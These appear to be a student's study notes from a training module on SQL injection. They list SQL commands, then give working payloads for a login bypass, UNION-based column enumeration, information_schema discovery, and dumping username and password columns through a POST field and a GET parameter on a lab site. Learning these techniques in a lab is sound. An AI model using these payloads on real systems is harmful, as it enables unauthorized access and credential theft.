
# SQL Commands
* Select <--
* Union <--
* Show Tables <--
* Show Columns <--
* Where <--
* Like <--
* Use
* Update
* Delete
* Insert into
* Create Database
* Alter Database
* Create Table
* Alter Table
* Drop Table
* Create Index
* Drop Index
### We are only extracting information in this module, so the only important onces that we will use are Union and Select
### At the end o every sql command you have to put a ";"
### 3 Default databases are information_schema, mysql, and performance_schema
## SQL Demo
```
mysql

show databases;

show tables from session; # Shows tables inside of session database

show colums from session.tires; # Shows all the colums that are in the tires table inside of the session database

select name,tireid,size,cost, from session.tires; # This shows the data inside of session.tires

show columns from session.car;

select carid,name,cost,size from session.tires union select carid,color,cost from session.car; # selects multiple things and joins them in the output
```
# Injecting
* SELECT id FROM users WHERE name=‘[tom' OR 1='1’ AND pass=‘tom' OR 1='1’]
  - You are forcing a boolean that will result in true into the user and password variable
### Injecting Demo
```
' OR 1='1
# Once we got in, we opened the developer console (inspect) and found a username variable
# Make sure to click the radio button to see information in RAW format
# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
# After doing this we were shown usernames and passwords in that variable
```
### Demo POST (text box)
1. Identify vulnerable field
2. Identify number of columns
3. Craft the golden statement
4. Craft the query
5. Craft Queries
```
# Identify vulnerable field
Audi' OR 1='1

# Identify Columns
Audi' UNION SELECT 1,2,3,4,5 #

# Create Golden Statement
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
[Audi ' UNION SELECT <column>,<column>,<column> FROM database.table #

# Craft Query
Audi ' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo #
Audi ' UNION SELECT id,2,name,pass,5 FROM session.user #
```
### DEMO GET (search bar)
```
# In the search bar replace & with:
OR 1=1

# Identify vulnerable field (selection 2)
?Selection=3 UNION SELECT 1,2,3

# Identify number of columns (3, displayed in 1,3,2 order)
?Selection=3 UNION SELECT 1,2,3

# Golden Statement order displayed in 1,3,2
?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

?Selection=3 UNION SELECT id,pass,name FROM session.user

@@version - this gets the version of the database

# Anbotate databases, tables, and columns
Database: session

session
Tables: Tires,car,session_log,user,userinfo

Columns
(Tires): tireid, name, size, cost
(car): carid, name, type, cost, color, year
etc....
```
`delete from comments where ID = 57; 57`
